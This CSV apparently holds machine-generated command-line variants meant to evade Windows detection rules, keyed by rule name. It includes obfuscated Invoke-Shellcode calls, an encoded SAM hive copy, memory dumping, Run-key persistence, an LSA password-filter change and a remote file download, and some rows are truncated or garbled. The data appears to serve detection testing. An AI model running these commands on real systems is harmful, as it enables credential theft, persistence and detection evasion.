rule_name,commandline_evasion,row_count,sources
proc_creation_win_powershell_export_certificate,"powershell.exe -COMmaND ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -COMmanD ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -COmMand ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -CoMMAND ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -CommAnD ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -Command ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -Command ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -c ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -c ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe -cOmMANd ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",5,gemini:4; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe /""Command"" ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",3,gemini:2; qwen32b
proc_creation_win_powershell_export_certificate,"powershell.exe /""Command"" ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",3,gemini:2; qwen32b
proc_creation_win_powershell_frombase64string,"powershell.exe -""Command"" ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",2,gemini:2
proc_creation_win_powershell_frombase64string,"powershell.exe -Command ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",6,gemini:6
proc_creation_win_powershell_frombase64string,"powershell.exe -c ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",6,gemini:6
proc_creation_win_powershell_frombase64string,"powershell.exe -coMManD ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",6,gemini:6
proc_creation_win_powershell_frombase64string,"powershell.exe /""Command"" ""$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')""",2,gemini:2
proc_creation_win_powershell_frombase64string,"powershell.exe /""EncodedCommand"" UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=",2,gemini:2
proc_creation_win_powershell_get_clipboard,"powershell.exe -Command ""Get-Clip`board""",1,gemini
proc_creation_win_powershell_get_clipboard,"powershell.exe -Command ""IEX ('Get-' + 'Clipboard')""",1,gemini
proc_creation_win_powershell_get_localgroup_member_recon,"powershell.exe -Command ""Get-LocalGroupMember -Group 'Administrators' | Export-Clixml -Path 'C:\Lab\out\groupmembers.xml'""",1,qwen14b
proc_creation_win_powershell_get_localgroup_member_recon,"powershell.exe -Command ""Get-LocalGroupMember -Group 'Administrators' | Format-List Name | Out-String | Set-Content 'C:\Lab\out\groupmembers.txt'""",1,qwen14b
proc_creation_win_powershell_get_localgroup_member_recon,"powershell.exe -Command ""Get-LocalGroupMember -Group 'Administrators' | Select-Object Name | Out-File C:\Lab\out\groupmembers.txt""",1,qwen14b
proc_creation_win_powershell_get_localgroup_member_recon,"powershell.exe /""EncodedCommand"" QUdULUxvY2FsR3JvdXBtZW50IC1Hcm91cCAiRG9tYWluIEFkbWlucyI=",1,gemini
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -COMMaNd ""Import-Module ('{0}\suspicious_module.psm1' -f $Env:Temp)""",2,gemini; qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -COmMAND ""Import-Module ('{0}\suspicious_module.psm1' -f $Env:Temp)""",2,gemini; qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -COmMaNd ""Import-Module $Env:TMP\suspicious_module.psm1""",1,gemini
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -Command ""Import-Module $Env:TMP\suspicious_module.psm1""",2,gemini; qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -Command ""Import-Module ('{0}\suspicious_module.psm1' -f $Env:Temp)""",1,gemini
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -Command ""ipmo C:\\Users\\Public\\""",1,qwen32b
proc_creation_win_powershell_import_module_susp_dirs,powershell.exe -Command Import-Module $Env:Public\,1,qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -Command Import-Module\x20""$Env:Appdata\",1,qwen32b
proc_creation_win_powershell_import_module_susp_dirs,powershell.exe -Command Import-Module\x20$Env:Appdata\,1,qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -c ""Import-Module $Env:TMP\suspicious_module.psm1""",2,gemini; qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -c ""Import-Module ('{0}\suspicious_module.psm1' -f $Env:Temp)""",1,gemini
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -cOmManD ""Import-Module ('{0}\suspicious_module.psm1' -f $Env:Temp)""",2,gemini; qwen32b
proc_creation_win_powershell_import_module_susp_dirs,"powershell.exe -comMAnd ""Import-Module $Env:TMP\suspicious_module.psm1""",1,gemini
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",2,gemini:2
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",2,gemini:2
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",3,gemini:2; qwen32b
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -C ""iex ('Invoke-' + 'Shell' + 'code')""",17,gemini:16; qwen32b
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -Command ""iex ('Invoke-' + 'Shell' + 'code')""",17,gemini:16; qwen32b
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe -c ""iex ('Invoke-' + 'Shell' + 'code')""",17,gemini:16; qwen32b
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe /""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",3,gemini:2; qwen32b
proc_creation_win_powershell_malicious_cmdlets,"powershell.exe /""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",2,gemini:2
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -""Command"" ""Write-Host ([Convert]::ToChar(0x41))""",3,gemini:2; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -COMMAnd ""Write-Host ([System.Char]0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -CoMMAnD ""Write-Host ([System.Char]0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -CoMMAnD ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -CoMMaNd ""Write-Host ([System.Char]0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -ComMand ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -CommAND ""Write-Host ([Convert]::ToChar(0x41))""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -CommaND ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -Command ""Write-Host ([Convert]::ToChar(0x41))""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -Command ""Write-Host ([System.Char]0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -Command ""Write-Host ([char] 0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -Command ""Write-Host ([char]65 + [char]66)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -Command ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -c ""Write-Host ([Convert]::ToChar(0x41))""",4,gemini:4
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -c ""Write-Host ([System.Char]0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -c ""Write-Host ([char] 0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -c ""Write-Host ([char]65 + [char]66)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -c ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -cOMMAnD ""Write-Host ([char]65 + [char]66)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -cOMmAnd ""Write-Host ([char]65)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -cOmmaND ""Write-Host ([char] 0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -coMmanD ""Write-Host ([Convert]::ToChar(0x41))""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -comMAnD ""Write-Host ([char]65 + [char]66)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe -commaND ""Write-Host ([char] 0x41)""",5,gemini:4; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe /""Command"" ""Write-Host ([Convert]::ToChar(0x41))""",2,gemini:2
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe /""Command"" ""Write-Host ([System.Char]0x41)""",2,gemini:2
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe /""Command"" ""Write-Host ([char] 0x41)""",3,gemini:2; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe /""Command"" ""Write-Host ([char]65 + [char]66)""",3,gemini:2; qwen32b
proc_creation_win_powershell_obfuscation_via_utf8,"powershell.exe /""Command"" ""Write-Host ([char]65)""",3,gemini:2; qwen32b
proc_creation_win_powershell_public_folder,"cmd.exe /c ""type C:\Users\Public\script.ps1 | powershell.exe -noprofile -""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -COmMaNd ""& 'C:\Users\Public\script.ps1'""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -CoMMaND ""& 'C:\Users\Public\script.ps1'""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -CoMmAND ""& 'C:\Users\Public\script.ps1'""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -ComManD ""& 'C:\Users\Public\script.ps1'""",2,gemini; qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -Command ""& 'C:\Users\Public\script.ps1'""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -Command ""& { C:\Users\Public\script.ps1 }""",1,qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -FILe ""C:\Users\Default\..\Public\script.ps1""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -c ""& 'C:\Users\Public\script.ps1'""",1,gemini
proc_creation_win_powershell_public_folder,"powershell.exe -coMmanD ""& 'C:\Users\Public\script.ps1'""",2,gemini; qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -f ""C:\Users\Public\script.ps1""",1,qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -fILe ""C:\Users\Default\..\Public\script.ps1""",2,gemini; qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -file ""C:\Users\Default\..\Public\script.ps1""",2,gemini; qwen32b
proc_creation_win_powershell_public_folder,"powershell.exe -file ""C:\Users\Public\script.ps1""",1,qwen32b
proc_creation_win_powershell_remove_mppreference,"powershell.exe -Command ""& { $cmd = 'Remove-MpPreference'; & $cmd -ControlledFolderAccessProtectedFolders 'C:\' }""",2,gemini; qwen32b
proc_creation_win_powershell_remove_mppreference,"powershell.exe -Command ""[System.Management.Automation.PowerShell]::Create().AddCommand('Remove-MpPreference').AddParameter('ControlledFolderAccessProtectedFolders', 'C:\').Invoke()""",2,gemini; qwen32b
proc_creation_win_powershell_run_script_from_input_stream,"powershell.exe -Command ""Get-Process | Where-Object { $_.ProcessName -eq 'notepad' } | Export-Clixml -Path C:\Lab\out\processes.xml""",2,qwen14b:2
proc_creation_win_powershell_run_script_from_input_stream,type script.ps1 | powershell.exe -,2,gemini:2
proc_creation_win_powershell_sam_access,"powershell.exe -""EncodedCommand"" YwBvAHAAeQAgACcAXABcAD8AXABHAEwATwBCAEEATABSAE8ATwBUAFwARABlAHYAaQBjAGUAXABIAGEAcgBkAGQAaQBzAGsAVgBvAGwAdQBtAGUAUwBoAGEAZABvAHcAQwBvAHAAeQAxAFwAVwBpAG4AZABvAHcAcwBcAFAAWQBTAFQARQBNADMAMgBcAGMAbwBuAGYAaQBnAFwAcwBhAG0AJwAgACcAQwA6AFwAdABlAG0AcABcAHMAYQBtACc=",1,gemini
proc_creation_win_powershell_sam_access,"powershell.exe /""EncodedCommand"" YwBvAHAAeQAgACcAXABcAD8AXABHAEwATwBCAEEATABSAE8ATwBUAFwARABlAHYAaQBjAGUAXABIAGEAcgBkAGQAaQBzAGsAVgBvAGwAdQBtAGUAUwBoAGEAZABvAHcAQwBvAHAAeQAxAFwAVwBpAG4AZABvAHcAcwBcAFAAWQBTAFQARQBNADMAMgBcAGMAbwBuAGYAaQBnAFwAcwBhAG0AJwAgACcAQwA6AFwAdABlAG0AcABcAHMAYQBtACc=",1,gemini
proc_creation_win_powershell_set_acl,"powershell.exe & { $termsrvDll = 'C:\\Windows\\System32\\termsrv.dll'; $ACL = Get-Acl $termsrvDll; $permission = 'Administrators','FullControl','Allow'; $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission; $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL }",1,gemini
proc_creation_win_powershell_stop_service,"""powershell.exe"" & {& 'Stop-Service' -Name """"fax"""" -force -erroraction silentlycontinue}",1,gemini
proc_creation_win_powershell_stop_service,"""powershell.exe"" & {Stop-Service  -Name """"fax"""" -force -erroraction silentlycontinue}",1,gemini
proc_creation_win_powershell_stop_service,"""powershell.exe"" & {spsv -Name """"fax"""" -force -erroraction silentlycontinue}",1,gemini
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -COmMAnd ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -ComManD ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -Command ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -Command ""(New-",2,qwen32b:2
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -c ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -cOmMand ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe -coMmANd ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",7,gemini:6; qwen32b
proc_creation_win_powershell_susp_ps_downloadfile,"powershell.exe /""Command"" ""$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",3,gemini:2; qwen32b
proc_creation_win_powershell_zip_compress,powershell.exe -NoProfile -WindowStyle Hidden -Command Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\Users\Public\Documents\archive.zip,1,gemini
proc_creation_win_psr_capture_screenshots,psr.exe /sc 1 /output C:\\Users\\Public\\report.zip,1,gemini
proc_creation_win_pua_chisel,"powershell.exe /""enc"" JABjAGwA... (encoded command with chisel)",1,gemini
proc_creation_win_pua_chisel,"rundll32.exe chisel.dll,server 8080",1,gemini
proc_creation_win_pua_seatbelt,"rundll32.exe C:\Data\Seatbelt.dll,main FullDFIR",3,gemini:3
proc_creation_win_python_pty_spawn,"python.exe --cmd ""exec(import('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIik='))""",1,gemini
proc_creation_win_python_pty_spawn,"python.exe --cmd ""import('pty').dict'spawn'""",1,gemini
proc_creation_win_python_pty_spawn,"python.exe /""c"" ""exec(import('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIik='))""",1,gemini
proc_creation_win_python_pty_spawn,"python.exe /""c"" ""import('pty').dict'spawn'""",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/P"" 1337 ""/o"""" C:\temp\ /fullmemdmp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"" 1337 ""/o"" C:\temp\ /FuLlMEmDmp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"" 1337 ""/o"" C:\temp\ /fUlLMeMDMp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"" 1337 ""/o"" C:\temp\ /fullmemdmp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"" 1337 ""/o"""" C:\temp\ -""fullmemdmp""",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"" 1337 ""/o"""" C:\temp\ /FUlLMemdMp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"""" 1337 ""/O"" C:\temp\ /FullMemDmP",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"""" 1337 ""/o"" C:\temp\ /fUlLMemdmp",1,gemini
proc_creation_win_rdrleakdiag_process_dumping,"rdrleakdiag.exe ""/p"""" 1337 ""/o"""" C:\temp\ /fUllMEMDMp",1,gemini
proc_creation_win_reg_add_run_key,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f",1,gemini
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f",2,gemini; qwen32b
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f",1,gemini
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPM /t REG_DWORD /d 2 /f",2,gemini; qwen32b
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f",2,gemini; qwen32b
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f",1,gemini
proc_creation_win_reg_bitlocker,"reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f",1,gemini
proc_creation_win_reg_bitlocker,"reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v ""EnableBDE""^""WithNoTPM"" /t REG_DWORD /d 1 /f",2,gemini; qwen32b
proc_creation_win_reg_credential_access_via_password_filter,"powershell.exe -Command ""Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value 'scecli'""",1,gemini
proc_creation_win_reg_credential_access_via_password_filter,"powershell.exe -Command ""Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value 'scecli\0*'""",2,gemini; qwen32b
proc_creation_win_reg_credential_access_via_password_filter,"powershell.exe -c ""Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value 'scecli'""",2,gemini; qwen32b
proc_creation_win_reg_credential_access_via_password_filter,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Notification Packages"" /t REG_MULTI_SZ /d ""scecli\0myfilter"" /f",1,gemini
proc_creation_win_reg_credential_access_via_password_filter,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Lsa"" /v test /t REG_SZ /d ""test"" /f",3,qwen14b:2; qwen32b
